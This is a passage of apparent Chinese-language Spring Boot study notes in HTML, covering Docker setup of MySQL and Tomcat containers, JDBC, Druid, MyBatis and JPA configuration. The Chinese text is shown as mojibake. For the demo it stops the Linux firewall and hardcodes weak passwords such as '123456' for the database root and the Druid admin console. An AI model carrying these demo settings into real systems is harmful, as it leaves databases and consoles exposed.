tomcat</span><br><span class="line">-dï¼šåå°è¿è¡Œ</span><br><span class="line">-p: å°†ä¸»æœºçš„ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ä¸€ä¸ªç«¯å£    ä¸»æœºç«¯å£:å®¹å™¨å†…éƒ¨çš„ç«¯å£</span><br><span class="line"></span><br><span class="line">10ã€ä¸ºäº†æ¼”ç¤ºç®€å•å…³é—­äº†linuxçš„é˜²ç«å¢™</span><br><span class="line">service firewalld status ï¼›æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</span><br><span class="line">service firewalld stopï¼šå…³é—­é˜²ç«å¢™</span><br><span class="line">11ã€æŸ¥çœ‹å®¹å™¨çš„æ—¥å¿—</span><br><span class="line">docker logs container-name/container-id</span><br><span class="line"></span><br><span class="line">æ›´å¤šå‘½ä»¤å‚çœ‹</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/docker/</span><br><span class="line">å¯ä»¥å‚è€ƒæ¯ä¸€ä¸ªé•œåƒçš„æ–‡æ¡£</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="3-å®‰è£…mysqlç¤ºä¾‹">3ï¼‰ã€å®‰è£…MySQLç¤ºä¾‹</span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql</span><br></pre></td></tr></table></figure><p>é”™è¯¯çš„å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -d mysql</span><br><span class="line">42f09819908bb72dd99ae19e792e0a5d03c48638421fa64cce5f8ba0f40f5846</span><br><span class="line"></span><br><span class="line">mysqlé€€å‡ºäº†</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                           PORTS               NAMES</span><br><span class="line">42f09819908b        mysql               &quot;docker-entrypoint.sh&quot;   34 seconds ago      Exited (1) 33 seconds ago                            mysql01</span><br><span class="line">538bde63e500        tomcat              &quot;catalina.sh run&quot;        About an hour ago   Exited (143) About an hour ago                       compassionate_</span><br><span class="line">goldstine</span><br><span class="line">c4f1ac60b3fc        tomcat              &quot;catalina.sh run&quot;        About an hour ago   Exited (143) About an hour ago                       lonely_fermi</span><br><span class="line">81ec743a5271        tomcat              &quot;catalina.sh run&quot;        About an hour ago   Exited (143) About an hour ago                       sick_ramanujan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//é”™è¯¯æ—¥å¿—</span><br><span class="line">[root@localhost ~]# docker logs 42f09819908b</span><br><span class="line">error: database is uninitialized and password option is not specified </span><br><span class="line">  You need to specify one of MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORDï¼›è¿™ä¸ªä¸‰ä¸ªå‚æ•°å¿…é¡»æŒ‡å®šä¸€ä¸ª</span><br></pre></td></tr></table></figure><p>æ­£ç¡®çš„å¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">b874c56bec49fb43024b3805ab51e9097da779f2f572c22c695305dedd684c5f</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">b874c56bec49        mysql               &quot;docker-entrypoint.sh&quot;   4 seconds ago       Up 3 seconds        3306/tcp            mysql01</span><br></pre></td></tr></table></figure><p>åšäº†ç«¯å£æ˜ å°„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -p 3306:3306 --name mysql02 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">ad10e4bc5c6a0f61cbad43898de71d366117d120e39db651844c0e73863b9434</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">ad10e4bc5c6a        mysql               &quot;docker-entrypoint.sh&quot;   4 seconds ago       Up 2 seconds        0.0.0.0:3306-&gt;3306/tcp   mysql02</span><br></pre></td></tr></table></figure><p>å‡ ä¸ªå…¶ä»–çš„é«˜çº§æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mysql03 -v /conf/mysql:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line">æŠŠä¸»æœºçš„/conf/mysqlæ–‡ä»¶å¤¹æŒ‚è½½åˆ° mysqldockerå®¹å™¨çš„/etc/mysql/conf.dæ–‡ä»¶å¤¹é‡Œé¢</span><br><span class="line">æ”¹mysqlçš„é…ç½®æ–‡ä»¶å°±åªéœ€è¦æŠŠmysqlé…ç½®æ–‡ä»¶æ”¾åœ¨è‡ªå®šä¹‰çš„æ–‡ä»¶å¤¹ä¸‹ï¼ˆ/conf/mysqlï¼‰</span><br><span class="line"></span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci</span><br><span class="line">æŒ‡å®šmysqlçš„ä¸€äº›é…ç½®å‚æ•°</span><br></pre></td></tr></table></figure><h1><span id="å…­-springbootä¸æ•°æ®è®¿é—®">å…­ã€SpringBootä¸æ•°æ®è®¿é—®</span></h1><h2><span id="1-jdbc">1ã€JDBC</span></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://192.168.15.22:3306/jdbc</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><p>â€‹é»˜è®¤æ˜¯ç”¨org.apache.tomcat.jdbc.pool.DataSourceä½œä¸ºæ•°æ®æºï¼›</p><p>â€‹æ•°æ®æºçš„ç›¸å…³é…ç½®éƒ½åœ¨DataSourcePropertiesé‡Œé¢ï¼›</p><p>è‡ªåŠ¨é…ç½®åŸç†ï¼š</p><p>org.springframework.boot.autoconfigure.jdbcï¼š</p><p>1ã€å‚è€ƒDataSourceConfigurationï¼Œæ ¹æ®é…ç½®åˆ›å»ºæ•°æ®æºï¼Œé»˜è®¤ä½¿ç”¨Tomcatè¿æ¥æ± ï¼›å¯ä»¥ä½¿ç”¨spring.datasource.typeæŒ‡å®šè‡ªå®šä¹‰çš„æ•°æ®æºç±»å‹ï¼›</p><p>2ã€SpringBooté»˜è®¤å¯ä»¥æ”¯æŒï¼›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.jdbc.pool.DataSourceã€HikariDataSourceã€BasicDataSourceã€</span><br></pre></td></tr></table></figure><p>3ã€è‡ªå®šä¹‰æ•°æ®æºç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generic DataSource configuration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(DataSource.class)</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(name = &quot;spring.datasource.type&quot;)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Generic</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">(DataSourceProperties properties)</span> &#123;</span><br><span class="line">       <span class="comment">//ä½¿ç”¨DataSourceBuilderåˆ›å»ºæ•°æ®æºï¼Œåˆ©ç”¨åå°„åˆ›å»ºå“åº”typeçš„æ•°æ®æºï¼Œå¹¶ä¸”ç»‘å®šç›¸å…³å±æ€§</span></span><br><span class="line">      <span class="keyword">return</span> properties.initializeDataSourceBuilder().build();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4ã€<strong>DataSourceInitializerï¼šApplicationListener</strong>ï¼›</p><p>â€‹ä½œç”¨ï¼š</p><p>â€‹1ï¼‰ã€runSchemaScripts();è¿è¡Œå»ºè¡¨è¯­å¥ï¼›</p><p>â€‹2ï¼‰ã€runDataScripts();è¿è¡Œæ’å…¥æ•°æ®çš„sqlè¯­å¥ï¼›</p><p>é»˜è®¤åªéœ€è¦å°†æ–‡ä»¶å‘½åä¸ºï¼š</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">schema-*.sqlã€data-*.sql</span></span><br><span class="line"><span class="attr">é»˜è®¤è§„åˆ™ï¼šschema.sqlï¼Œschema-all.sqlï¼›</span></span><br><span class="line"><span class="attr">å¯ä»¥ä½¿ç”¨</span>   <span class="string"></span></span><br><span class="line"><span class="attr">schema</span>:<span class="string"></span></span><br><span class="line">      <span class="attr">-</span> <span class="string">classpath:department.sql</span></span><br><span class="line">      <span class="attr">æŒ‡å®šä½ç½®</span></span><br></pre></td></tr></table></figure><p>5ã€æ“ä½œæ•°æ®åº“ï¼šè‡ªåŠ¨é…ç½®äº†JdbcTemplateæ“ä½œæ•°æ®åº“</p><h2><span id="2-æ•´åˆdruidæ•°æ®æº">2ã€æ•´åˆDruidæ•°æ®æº</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">å¯¼å…¥druidæ•°æ®æº</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DruidConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">druid</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span>  <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é…ç½®Druidçš„ç›‘æ§</span></span><br><span class="line">    <span class="comment">//1ã€é…ç½®ä¸€ä¸ªç®¡ç†åå°çš„Servlet</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServletRegistrationBean <span class="title function_">statViewServlet</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ServletRegistrationBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>(<span class="keyword">new</span> <span class="title class_">StatViewServlet</span>(), <span class="string">&quot;/druid/*&quot;</span>);</span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        initParams.put(<span class="string">&quot;loginUsername&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        initParams.put(<span class="string">&quot;loginPassword&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        initParams.put(<span class="string">&quot;allow&quot;</span>,<span class="string">&quot;&quot;</span>);<span class="comment">//é»˜è®¤å°±æ˜¯å…è®¸æ‰€æœ‰è®¿é—®</span></span><br><span class="line">        initParams.put(<span class="string">&quot;deny&quot;</span>,<span class="string">&quot;192.168.15.21&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2ã€é…ç½®ä¸€ä¸ªwebç›‘æ§çš„filter</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean <span class="title function_">webStatFilter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">FilterRegistrationBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>();</span><br><span class="line">        bean.setFilter(<span class="keyword">new</span> <span class="title class_">WebStatFilter</span>());</span><br><span class="line"></span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        initParams.put(<span class="string">&quot;exclusions&quot;</span>,<span class="string">&quot;*.js,*.css,/druid/*&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line"></span><br><span class="line">        bean.setUrlPatterns(Arrays.asList(<span class="string">&quot;/*&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="3-æ•´åˆmybatis">3ã€æ•´åˆMyBatis</span></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180305194443.png"></p><p>æ­¥éª¤ï¼š</p><p>â€‹1ï¼‰ã€é…ç½®æ•°æ®æºç›¸å…³å±æ€§ï¼ˆè§ä¸Šä¸€èŠ‚Druidï¼‰</p><p>â€‹2ï¼‰ã€ç»™æ•°æ®åº“å»ºè¡¨</p><p>â€‹3ï¼‰ã€åˆ›å»ºJavaBean</p><h3><span id="4-æ³¨è§£ç‰ˆ">4ï¼‰ã€æ³¨è§£ç‰ˆ</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æŒ‡å®šè¿™æ˜¯ä¸€ä¸ªæ“ä½œæ•°æ®åº“çš„mapper</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DepartmentMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from department where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Department <span class="title function_">getDeptById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete(&quot;delete from department where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteDeptById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Options(useGeneratedKeys = true,keyProperty = &quot;id&quot;)</span></span><br><span class="line">    <span class="meta">@Insert(&quot;insert into department(departmentName) values(#&#123;departmentName&#125;)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertDept</span><span class="params">(Department department)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update(&quot;update department set departmentName=#&#123;departmentName&#125; where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateDept</span><span class="params">(Department department)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼š</p><p>è‡ªå®šä¹‰MyBatisçš„é…ç½®è§„åˆ™ï¼›ç»™å®¹å™¨ä¸­æ·»åŠ ä¸€ä¸ªConfigurationCustomizerï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@org</span>.springframework.context.annotation.Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ConfigurationCustomizer <span class="title function_">configurationCustomizer</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigurationCustomizer</span>()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">customize</span><span class="params">(Configuration configuration)</span> &#123;</span><br><span class="line">                configuration.setMapUnderscoreToCamelCase(<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨MapperScanæ‰¹é‡æ‰«ææ‰€æœ‰çš„Mapperæ¥å£ï¼›</span><br><span class="line"><span class="meta">@MapperScan(value = &quot;com.atguigu.springboot.mapper&quot;)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringBoot06DataMybatisApplication</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">SpringApplication.run(SpringBoot06DataMybatisApplication.class, args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="5-é…ç½®æ–‡ä»¶ç‰ˆ">5ï¼‰ã€é…ç½®æ–‡ä»¶ç‰ˆ</span></h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">config-location:</span> <span class="string">classpath:mybatis/mybatis-config.xml</span> <span class="string">æŒ‡å®šå…¨å±€é…ç½®æ–‡ä»¶çš„ä½ç½®</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mybatis/mapper/*.xml</span>  <span class="string">æŒ‡å®šsqlæ˜ å°„æ–‡ä»¶çš„ä½ç½®</span></span><br></pre></td></tr></table></figure><p>æ›´å¤šä½¿ç”¨å‚ç…§</p><p><a href="http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/">http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/</a></p><h2><span id="4-æ•´åˆspringdata-jpa">4ã€æ•´åˆSpringData JPA</span></h2><h3><span id="1-springdataç®€ä»‹">1ï¼‰ã€SpringDataç®€ä»‹</span></h3><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306105412.png"></p><h3><span id="2-æ•´åˆspringdata-jpa">2ï¼‰ã€æ•´åˆSpringData JPA</span></h3><p>JPA:ORMï¼ˆObject Relational Mappingï¼‰ï¼›</p><p>1ï¼‰ã€ç¼–å†™ä¸€ä¸ªå®ä½“ç±»ï¼ˆbeanï¼‰å’Œæ•°æ®è¡¨è¿›è¡Œæ˜ å°„ï¼Œå¹¶ä¸”é…ç½®å¥½æ˜ å°„å…³ç³»ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨JPAæ³¨è§£é…ç½®æ˜ å°„å…³ç³»</span></span><br><span class="line"><span class="meta">@Entity</span> <span class="comment">//å‘Šè¯‰JPAè¿™æ˜¯ä¸€ä¸ªå®ä½“ç±»ï¼ˆå’Œæ•°æ®è¡¨æ˜ å°„çš„ç±»ï¼‰</span></span><br><span class="line"><span class="meta">@Table(name = &quot;tbl_user&quot;)</span> <span class="comment">//@Tableæ¥æŒ‡å®šå’Œå“ªä¸ªæ•°æ®è¡¨å¯¹åº”;å¦‚æœçœç•¥é»˜è®¤è¡¨åå°±æ˜¯userï¼›</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">//è¿™æ˜¯ä¸€ä¸ªä¸»é”®</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span><span class="comment">//è‡ªå¢ä¸»é”®</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;last_name&quot;,length = 50)</span> <span class="comment">//è¿™æ˜¯å’Œæ•°æ®è¡¨å¯¹åº”çš„ä¸€ä¸ªåˆ—</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="meta">@Column</span> <span class="comment">//çœç•¥é»˜è®¤åˆ—åå°±æ˜¯å±æ€§å</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br></pre></td></tr></table></figure><p>2ï¼‰ã€ç¼–å†™ä¸€ä¸ªDaoæ¥å£æ¥æ“ä½œå®ä½“ç±»å¯¹åº”çš„æ•°æ®è¡¨ï¼ˆRepositoryï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç»§æ‰¿JpaRepositoryæ¥å®Œæˆå¯¹æ•°æ®åº“çš„æ“ä½œ</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User,Integer&gt; &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3ï¼‰ã€åŸºæœ¬çš„é…ç½®JpaProperties</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span>  </span><br><span class="line"> <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line"><span class="comment">#     æ›´æ–°æˆ–è€…åˆ›å»ºæ•°æ®è¡¨ç»“æ„</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"><span class="comment">#    æ§åˆ¶å°æ˜¾ç¤ºSQL</span></span><br><span class="line">    <span class="attr">show-sql:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1><span id="ä¸ƒ-å¯åŠ¨é…ç½®åŸç†">ä¸ƒã€å¯åŠ¨é…ç½®åŸç†</span></h1><p>å‡ ä¸ªé‡è¦çš„äº‹ä»¶å›è°ƒæœºåˆ¶</p><p>é…ç½®åœ¨META-INF&#x2F;spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><p><strong>SpringApplicationRunListener</strong></p><p>åªéœ€è¦æ”¾åœ¨iocå®¹å™¨ä¸­</p><p><strong>ApplicationRunner</strong></p><p><strong>CommandLineRunner</strong></p><p>å¯åŠ¨æµç¨‹ï¼š</p><h2><span id="1-åˆ›å»ºspringapplicationå¯¹è±¡"><strong>1ã€åˆ›å»ºSpringApplicationå¯¹è±¡</strong></span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">initialize(sources);</span><br><span class="line"><span class="keyword">private</span> <span 